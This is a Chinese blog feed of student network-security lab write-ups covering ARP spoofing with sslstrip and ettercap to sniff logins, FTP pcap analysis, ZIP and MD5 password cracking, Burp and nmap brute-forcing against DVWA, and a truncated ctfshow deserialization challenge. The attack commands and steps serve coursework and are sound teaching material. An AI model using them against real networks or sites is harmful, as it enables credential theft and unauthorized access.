这个文件，把Linux下面的1，2，4，5条的注释去掉，我这是已经把注释去除完了</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221101203612474.png" alt="image-20221101203612474"></p><p>然后再使用命令：sslstrip -a -f -k 开启转发</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221101202116971.png" alt="image-20221101202116971"></p><p>接着再打开另一个终端，重复一次阻断通信的操作。然后就可以利用ettercap来进行密码嗅探了，使用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221101203457054.png" alt="image-20221101203457054"></p><p>这时候 当目标打开一个网站时，它的ip发送端口 登录账号以及密码 访问的网站链接都会显示出来。下图是我在windows xp上访问桂林生活网并随意输入用户名密码进行登录，成功欺骗获取到登录的账号密码。</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102113135243.png" alt="image-20221102113135243"></p><h2 id="3-FTP数据还原部分：利用WireShark打开实验实验数据data-pcapng。"><a href="#3-FTP数据还原部分：利用WireShark打开实验实验数据data-pcapng。" class="headerlink" title="3.FTP数据还原部分：利用WireShark打开实验实验数据data.pcapng。"></a>3.FTP数据还原部分：利用WireShark打开实验实验数据data.pcapng。</h2><h3 id="3-1-FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？"><a href="#3-1-FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？" class="headerlink" title="3.1 FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？"></a>3.1 FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？</h3><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102114507910.png" alt="image-20221102114507910"></p><p>可见ftp服务器的ip地址为192.168.182.1 ,ftp服务常常开在21端口，所以我们只需要过滤21端口的数据包进行查看即可。.1的ip地址通常为网关ip，但并不绝对。</p><h3 id="3-2客户端登录FTP服务器的账号和密码分别是什么"><a href="#3-2客户端登录FTP服务器的账号和密码分别是什么" class="headerlink" title="3.2客户端登录FTP服务器的账号和密码分别是什么?"></a>3.2客户端登录FTP服务器的账号和密码分别是什么?</h3><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102114852286.png" alt="image-20221102114852286"></p><p>通过过滤ftp的数据包可以发现，客户端进行了两次登录账号密码分别为</p><p>anonymous&#x2F;<a href="mailto:&#x6d;&#111;&#x7a;&#x69;&#x6c;&#x6c;&#x61;&#64;&#101;&#120;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#99;&#111;&#x6d;">&#x6d;&#111;&#x7a;&#x69;&#x6c;&#x6c;&#x61;&#64;&#101;&#120;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#99;&#111;&#x6d;</a>  ：登录失败，密码错误</p><p>student&#x2F;sN46i5y  ：登录成功。</p><h3 id="3-3-客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？（提示：文件名有可能是中文。）"><a href="#3-3-客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？（提示：文件名有可能是中文。）" class="headerlink" title="3.3 客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？（提示：文件名有可能是中文。）"></a>3.3 客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？（提示：文件名有可能是中文。）</h3><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102115134178.png" alt="image-20221102115134178"></p><p>继续进行查找，显而易见两个文件为1.zip&#x2F;复习题.txt。</p><h3 id="3-4-还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。"><a href="#3-4-还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。" class="headerlink" title="3.4 还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。"></a>3.4 还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。</h3><p>追踪流，找到zip数据包，并将其导出。</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102115514247.png" alt="image-20221102115514247"></p><p>导出后打开</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102115635309.png" alt="image-20221102115635309"></p><p>发现需要密码，根据题目提示进行爆破，密码为6为数字。工具有很多个，比如ziperello，ARCHPR，以及kali中预装好的fcrackzip。</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102120026342.png" alt="image-20221102120026342"></p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102120116009.png" alt="image-20221102120116009"></p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102120638073.png" alt="image-20221102120638073"></p><h3 id="3-5-TXT文件的内容是什么？"><a href="#3-5-TXT文件的内容是什么？" class="headerlink" title="3.5 TXT文件的内容是什么？"></a>3.5 TXT文件的内容是什么？</h3><p>继续刚刚的追踪流数据，看到流4即为txt文件的内容</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102121253906.png" alt="image-20221102121253906"></p><h2 id="网站破解部分："><a href="#网站破解部分：" class="headerlink" title="网站破解部分："></a>网站破解部分：</h2><p>以*****为目标网站，构造字典（wordlist），其中包含你的正确密码，利用burpsuite进行字典攻击，实施字典攻击，你是如何判断某个密码为破解得到的正确密码，截图。</p><p>这种爆破破解的目标是不需要登录验证的网站，我这里以社团搭建的靶场作为目标网站，</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102162719468.png" alt="image-20221102162719468"></p><p>要求爆破密码，所以先输入好正确的用户名，再随便输入一个密码进行抓包，然后发送到Intrude模块，</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102162913410.png" alt="image-20221102162913410"></p><p>清空所有变量，再单独添加password为变量</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102163004157.png" alt="image-20221102163004157"></p><p>在payload这里导入我们提前生成的字典，其中包含正确的登录密码，然后开始爆破，通过响应内容的长度不同来确定正确的密码，即zxc123456，有时候也可以通过观看状态的不同来确定。</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102163141207.png" alt="image-20221102163141207"></p><h2 id="4、MD5破解"><a href="#4、MD5破解" class="headerlink" title="4、MD5破解"></a>4、MD5破解</h2><p>  SqlMap得到某数据库用户表信息，用户口令的MD5值为7282C5050CFE7DF5E09A33CA456B94AE</p><p>那么，口令的明文是什么？（提示：MD5值破解）</p><p>网上找在线工具进行md5解密即可</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221102132919525.png" alt="image-20221102132919525"></p><h2 id="5、John-the-Ripper的作用是什么？"><a href="#5、John-the-Ripper的作用是什么？" class="headerlink" title="5、John the Ripper的作用是什么？"></a>5、John the Ripper的作用是什么？</h2><p><code>John the Ripper</code> 是一款大受欢迎的、免费的开源软件。也是一个基于字典的快速破解密码的工具，是一款用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的<a href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95&spm=1001.2101.3001.7020">加密算法</a>，如 <code>DES</code> 、 <code>MD4</code> 、 <code>MD5</code> 等。 <code>John the Ripper</code> 支持字典破解方式和暴力破解方式。它支持多种不同类型的系统架构，包括 <code>Unix</code> 、 <code>Linux</code> 、 <code>Windows</code> 、 <code>DOS</code> 模式、 <code>BeOS</code> 和 <code>OpenVMS</code> ，主要目的是破解不够牢固的 <code>Unix/Linux</code> 系统密码。</p><p>思考问题：</p><p><strong>1、 谈谈如何防止ARP攻击。</strong></p><p>arp静态绑定，安装arp防火墙，交换机上启用DAI技术，安装杀毒软件，避免被他人轻易攻击，由于arp属于内网协议，要是受到arp攻击了，嫌疑人一定在内网中。</p><p><strong>2、 安全的密码（口令）应遵循的原则。</strong></p><p>大小写字母+数字+特殊符号。口令足够长，越复杂越安全。</p><p><strong>3、 谈谈字典攻击中字典的重要性。</strong></p><p>字典可以大大缩小范围，提高攻击效率，攻击时一个好的字典是必不可少的。</p><p><strong>4、 实验小结。</strong></p><span id="more"></span><hr><p>If you like TeXt, don’t forget to give me a star. :star2:</p><p><a href="https://github.com/7562ajj/7562ajj.github.io"><img src="https://img.shields.io/github/stars/kitian616/jekyll-TeXt-theme.svg?label=Stars&style=social" alt="Star This Project"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> TeXt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验一：网络扫描与网络侦擦</title>
      <link href="/2022/11/24/2022-10-28-shi-yan-1-wang-luo-sao-miao-yu-wang-luo-zhen-cha/"/>
      <url>/2022/11/24/2022-10-28-shi-yan-1-wang-luo-sao-miao-yu-wang-luo-zhen-cha/</url>
      
        <content type="html"><![CDATA[<h2 id="1-搜索麻省理工学院网站中文件名包含“network-security”的pdf文档"><a href="#1-搜索麻省理工学院网站中文件名包含“network-security”的pdf文档" class="headerlink" title="1.搜索麻省理工学院网站中文件名包含“network security”的pdf文档"></a>1.搜索麻省理工学院网站中文件名包含“network security”的pdf文档</h2><p>百度搜索得到麻省理工学院官网网址：<a href="http://www.mit.edu/">www.mit.edu</a></p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221025213750287.png" alt="image-20221025213750287"></p><h2 id="2-图片中的女孩在哪旅行"><a href="#2-图片中的女孩在哪旅行" class="headerlink" title="2.图片中的女孩在哪旅行"></a>2.图片中的女孩在哪旅行</h2><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><p>根据图片中的信息38 letrentehuit cafe brasserie，很明显是个咖啡店，在大众点评上查询店名</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221027204719071.png" alt="image-20221027204719071"></p><p>有个地址信息，上地图查询该地址</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221027204853804.png" alt="image-20221027204853804"></p><p>得到的位置是法国巴黎的一个咖啡店。</p><h2 id="3-手机位置定位，通过LAC和CID查询基站位置。"><a href="#3-手机位置定位，通过LAC和CID查询基站位置。" class="headerlink" title="3.手机位置定位，通过LAC和CID查询基站位置。"></a>3.手机位置定位，通过LAC和CID查询基站位置。</h2><p>先查询自己手机的LAC和CID信息</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/wps1.jpg" alt="img"></p><p>拿到信息之后通过微信公众号LBS（方法不唯一）查询定位手机的位置</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/24CBC99BFF7CE8085427041ED9FFE035.jpg" alt="img"></p><h2 id="4-编码解码"><a href="#4-编码解码" class="headerlink" title="4.编码解码"></a>4.编码解码</h2><p>解密一串base64编码，直接在网上找在线工具进行解码。</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028123310470.png" alt="image-20221028123310470"></p><h2 id="5-地址信息"><a href="#5-地址信息" class="headerlink" title="5.地址信息"></a>5.地址信息</h2><p>5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028125539465.png" alt="image-20221028125539465"></p><p>再通过站长工具进行ip地址查询</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028131943787.png" alt="image-20221028131943787"></p><p>查询到此ip物理地址为桂林电子科技大学，进入桂电官网得到桂电官网域名为<a href="http://www.guet.edu.cn.尝试ping,/">www.guet.edu.cn。尝试ping，</a></p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028132845503.png" alt="image-20221028132845503"></p><p>由此可以得出该用户使用苹果设备访问的桂电官网。</p><p>5.2 访问<a href="https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。">https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。</a></p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028135905180.png" alt="image-20221028135905180"></p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028135123568.png" alt="image-20221028135123568"></p><p>两者不一样，因为前者查询的是公网ip，后者查询的是内网ip。</p><h2 id="6-nmap的使用"><a href="#6-nmap的使用" class="headerlink" title="6.nmap的使用"></a>6.nmap的使用</h2><h3 id="6-1利用NMAP扫描Metasploitable2的端口开放情况，并说明其中其中四个端口开放的服务。"><a href="#6-1利用NMAP扫描Metasploitable2的端口开放情况，并说明其中其中四个端口开放的服务。" class="headerlink" title="6.1利用NMAP扫描Metasploitable2的端口开放情况，并说明其中其中四个端口开放的服务。"></a>6.1利用NMAP扫描Metasploitable2的端口开放情况，并说明其中其中四个端口开放的服务。</h3><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028140922525.png" alt="image-20221028140922525"></p><p>22端口开放ssh服务：SSH 为 [Secure Shell](<a href="https://baike.baidu.com/item/Secure">https://baike.baidu.com/item/Secure</a> Shell?fromModule&#x3D;lemma_inlink) 的缩写，其为建立在应用层基础上的专为<a href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95/1071998?fromModule=lemma_inlink">远程登录</a>会话和其他网络服务提供安全性的协议</p><p>80端口开放http服务：为网站服务器，开启之后可用浏览器进行访问。</p><p>21端口开放ftp服务：FTP是FileTransferProtocol(文件传输协议)的英文简称,而中文简称为“文传协议”，一般用于数据的上传或下载。</p><p>3306端口开放mysql服务：指开启了mysql数据库，是一个关系型数据库管理系统。</p><h3 id="6-2利用NMAP扫描Metasploitable2的操作系统类型"><a href="#6-2利用NMAP扫描Metasploitable2的操作系统类型" class="headerlink" title="6.2利用NMAP扫描Metasploitable2的操作系统类型."></a>6.2利用NMAP扫描Metasploitable2的操作系统类型.</h3><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028142301496.png" alt="image-20221028142301496"></p><h3 id="6-3-利用NMAP穷举-Metasploitable2上dvwa的登录账号和密码"><a href="#6-3-利用NMAP穷举-Metasploitable2上dvwa的登录账号和密码" class="headerlink" title="6.3 利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码"></a>6.3 利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码</h3><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 --script=http-form-brute --script-args=http-form-brute.path=/dvwa/login.php 靶机ip</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028181213519.png" alt="image-20221028181213519"></p><p>成功爆破得到有效登录口令admin&#x2F;password</p><h3 id="6-4-查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"><a href="#6-4-查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。" class="headerlink" title="6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"></a>6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。</h3><p>永恒之蓝漏洞在2017年5月12日爆发，席卷全球。该漏洞存在于windows操作系统，利用的是Windows SMB远程提权漏洞，可以攻击开放了445 端口的 Windows 系统并提升至系统权限，潜入电脑对多种文件类型加密，并弹出勒索框，向用户索要赎金(以比特币支付)用于解密。该病毒只攻击Windows系统的电脑，几乎所有的Windows系统如果没有打补丁，都会被攻击。</p><h2 id="7-利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"><a href="#7-利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。" class="headerlink" title="7.利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"></a>7.利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。</h2><p>进入到zoomeye官网，搜索西门子工控设备，查看其相关漏洞</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028200906966.png" alt="image-20221028200906966"></p><p>存在多个高危漏洞，那么可能就会被一些黑客利用，这样的话信息泄露严在所难免，上传漏洞被利用的话还可能会被挂个马啥的，再严重的话比如rce、权限提升漏洞，或者多个漏洞一起打一套组合拳，就可能会服务器系统崩溃等一系列严重的问题。</p><h2 id="8-Winhex简单数据恢复与取证"><a href="#8-Winhex简单数据恢复与取证" class="headerlink" title="8.Winhex简单数据恢复与取证"></a>8.Winhex简单数据恢复与取证</h2><h3 id="8-1-elephant-jpg不能打开了，利用工具将其修复，说明修复过程。"><a href="#8-1-elephant-jpg不能打开了，利用工具将其修复，说明修复过程。" class="headerlink" title="8.1 elephant.jpg不能打开了，利用工具将其修复，说明修复过程。"></a>8.1 elephant.jpg不能打开了，利用工具将其修复，说明修复过程。</h3><p>图片打不开应该是因为文件头或者文件尾错误导致的，jpg的文件头为FF D8 FF 文件尾为FF D9。将图片用010或者winhex打开发现是文件头错误，将0000修改为FFD8就能正常打开了，</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028203013588.png" alt="image-20221028203013588"></p><h3 id="8-2-笑脸背后的阴霾：图片smile有什么隐藏信息"><a href="#8-2-笑脸背后的阴霾：图片smile有什么隐藏信息" class="headerlink" title="8.2 笑脸背后的阴霾：图片smile有什么隐藏信息"></a>8.2 笑脸背后的阴霾：图片smile有什么隐藏信息</h3><p>将图片用010或者winhex打开，在最底部就会发现隐藏的信息：tom is the killer</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028205344679.png" alt="image-20221028205344679"></p><h3 id="8-3"><a href="#8-3" class="headerlink" title="8.3"></a>8.3</h3><h2 id="9-讨论学校热点GUET-WiFi的安全问题"><a href="#9-讨论学校热点GUET-WiFi的安全问题" class="headerlink" title="9.讨论学校热点GUET-WiFi的安全问题"></a>9.讨论学校热点GUET-WiFi的安全问题</h2><p>对于学校的WiFi，这自然是不安全的，没有密码的wifi，数据传递过程中的数据也是没有进行加密的，所以说假如大家都在连校园wifi，此时大家都处于一个网段下，大家上网的数据都是可以被其他人给拦截到的，这其中可能就包括了你登陆某一个网站时输入的账号密码信息等，这样就毫无安全可言。或者是有一些人稍微有点技术，他想搞点事情，他可以制作一个钓鱼wifi，将wifi名称改成和校园网一模一样的，然后趁着真正的校园网崩溃的时候，将此WiFi散发出去，让大家连，此时大家就都中了他的计谋，这时候连上这个wifi的同学就没有任何隐私了。</p><span id="more"></span><hr><p>If you like TeXt, don’t forget to give me a star. :star2:</p><p><a href="https://github.com/7562ajj/7562ajj.github.io"><img src="https://img.shields.io/github/stars/kitian616/jekyll-TeXt-theme.svg?label=Stars&style=social" alt="Star This Project"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> TeXt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于kali用不同的网络模式下与物理机的关系</title>
      <link href="/2022/11/24/2022-10-07-guan-yu-xu-ni-ji-de-san-chong-wang-luo-mo-shi/"/>
      <url>/2022/11/24/2022-10-07-guan-yu-xu-ni-ji-de-san-chong-wang-luo-mo-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="关于kali用不同的网络模式下与物理机的关系（是否在同一个子网）"><a href="#关于kali用不同的网络模式下与物理机的关系（是否在同一个子网）" class="headerlink" title="关于kali用不同的网络模式下与物理机的关系（是否在同一个子网）"></a>关于kali用不同的网络模式下与物理机的关系（是否在同一个子网）</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>1.下载VMware和kali虚拟机。</p><h3 id="虚拟机中的三种不同的网络模式"><a href="#虚拟机中的三种不同的网络模式" class="headerlink" title="虚拟机中的三种不同的网络模式"></a>虚拟机中的三种不同的网络模式</h3><h4 id="一-桥接模式"><a href="#一-桥接模式" class="headerlink" title="一.桥接模式"></a>一.桥接模式</h4><p> 桥接模式下，<a href="https://so.csdn.net/so/search?q=%E8%99%9A%E6%8B%9F%E6%9C%BA&spm=1001.2101.3001.7020">虚拟机</a>和物理机处于同一网段，可以和外部处于同一网段的计算机进行直接通信。如图所示，</p><p><img src="/image/1.png"></p><h4 id="二-NAT模式"><a href="#二-NAT模式" class="headerlink" title="二.NAT模式"></a>二.NAT模式</h4><p> NAT模式下，虚拟机IP地址和物理机真实网卡的IP地址不在同一网段，但是和物理机的虚拟网卡处于同一网段。虚拟机可以通过IP地址转换和外部通信，但是外部无法向虚拟机通信，有点类似私网地址可以通过路由器的公网地址和互联网通信，但互联网无法访问私网地址。</p><p><img src="/image/2.png"></p><h4 id="三-仅主机模式"><a href="#三-仅主机模式" class="headerlink" title="三.仅主机模式"></a>三.仅主机模式</h4><p>仅主机模式下，虚拟机是一个独立系统，不与外部发生通信。</p><h3 id="本地模拟"><a href="#本地模拟" class="headerlink" title="本地模拟"></a>本地模拟</h3><p>介绍完之后我们在本地实操看一下具体的情况（分别以桥接、NAT模式设置kali虚拟机）</p><p>先把kali的设置为NAT模式</p><p><img src="/image/3.png"></p><p>配置完成之后进入到kali系统，进入终端使用ifconfig命令查看IP地址</p><p><img src="/image/4.png"></p><p>同时 在本地也查看一下ip地址</p><p><img src="/image/5.png"></p><p>可以发现kali虚拟机的IP地址和物理机真实网卡（WLAN）的IP地址不在同一网段，但是和物理机的虚拟网卡（vmnet8）处于同一网段。</p><p>接着我们把kali设置为桥接模式看看此时和物理机是个什么关系，需要设置桥接模式为桥接到物理机的真实网卡上。以下为配置过程</p><p><img src="/image/6.png"></p><p><img src="/image/7.png"></p><p><img src="/image/8.png"></p><p>配置好之后打开kali查看ip就可以了</p><p><img src="/image/9.png"></p><p><img src="/image/10.png"></p><p>可以看到，在桥接模式下，kali的ip和物理机的真是ip是在同一网段下的。</p><span id="more"></span><hr><p>If you like TeXt, don’t forget to give me a star. :star2:</p><p><a href="https://github.com/7562ajj/7562ajj.github.io"><img src="https://img.shields.io/github/stars/kitian616/jekyll-TeXt-theme.svg?label=Stars&style=social" alt="Star This Project"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> TeXt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wireshark拦截手机数据包</title>
      <link href="/2022/11/24/2022-10-06-ke-cheng-nei-rong-fu-xi-wireshark-lan-jie-shou-ji-shu-ju-bao/"/>
      <url>/2022/11/24/2022-10-06-ke-cheng-nei-rong-fu-xi-wireshark-lan-jie-shou-ji-shu-ju-bao/</url>
      
        <content type="html"><![CDATA[<h1 id="课程内容复现-wireshark拦截手机数据包"><a href="#课程内容复现-wireshark拦截手机数据包" class="headerlink" title="课程内容复现-wireshark拦截手机数据包"></a>课程内容复现-wireshark拦截手机数据包</h1><h2 id="课程目的"><a href="#课程目的" class="headerlink" title="课程目的"></a>课程目的</h2><p>拦截手机向电脑发送的图片数据包，并恢复该图片。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>1.让手机和电脑连接同一个wifi，使电脑和手机在同一个局域网下。</p><p>2.准备一个wireshark工具。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>打开wireshark，并捕获WLAN网络的流量。</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221006204026006.png" alt="image-20221006204026006"></p><p>我们是要对手机的数据包进行捕获，所以对数据包进行过滤。</p><p>首先先查看手机的ip地址，接着使用ip.src&#x3D;&#x3D;ip命令进行过滤</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221006204452390.png" alt="image-20221006204452390"></p><p>接着我们用手机向电脑发送一张图片。</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221006204609322.png" alt="image-20221006204609322"></p><p>发送完之后再看到wireshark页面，可以发现成功拦截到了数据</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221006204843362.png" alt="image-20221006204843362"></p><p>在这大量的数据包中，随便翻翻看了下，绝大多数都是tcp的数据包，存在几个http的包，而且发现jpg图片数据包</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221006205033059.png" alt="image-20221006205033059"></p><p>接着我们追踪http流。步骤：分析–&gt;追踪流–&gt;http流。</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221006205717375.png" alt="image-20221006205717375"></p><p>很明显，这个就是我们想要的数据包，接着我们将其导出到本地</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221006210126006.png" alt="image-20221006210126006"></p><p>将其保存到桌面，并命名为shouji.jpg。直接将其打开会发现该文件已损坏，</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221006211009335.png" alt="image-20221006211009335"></p><p>我们用winhex或者010打开看看是什么情况。</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221006210413413.png" alt="image-20221006210413413"></p><p>熟悉各种文件文件头的一眼就可以发现当前该文件的文件头并不是jpg文件的，jpg文件头为FFD8FF。不了解的可自行百度。因为文件头错误导致的文件损坏，所以我们只需将FFD8FF之前的字节删除掉即可。</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221006210818357.png" alt="image-20221006210818357"></p><p>删除完成之后点击保存，返回打开我们刚刚导出的图片</p><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221006210913588.png" alt="image-20221006210913588"></p><p>可以看到已成功恢复。任务完成！！</p><span id="more"></span><hr><p>If you like TeXt, don’t forget to give me a star. :star2:</p><p><a href="https://github.com/7562ajj/7562ajj.github.io"><img src="https://img.shields.io/github/stars/kitian616/jekyll-TeXt-theme.svg?label=Stars&style=social" alt="Star This Project"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> TeXt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-反序列化</title>
      <link href="/2022/11/24/2022-10-06-ctfshow-fan-xu-lie-hua/"/>
      <url>/2022/11/24/2022-10-06-ctfshow-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow-反序列化"><a href="#ctfshow-反序列化" class="headerlink" title="ctfshow-反序列化"></a>ctfshow-反序列化</h1><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><p>根据源代码，直接进行get传参：?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line"></span><br><span class="line">    public function checkVip()&#123;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function vipOneKeyGetFlag()&#123;</span><br><span class="line">        if($this-&gt;isVip)&#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo &quot;your flag is &quot;.$flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;no vip, no flag&quot;;</span><br><span class="line">     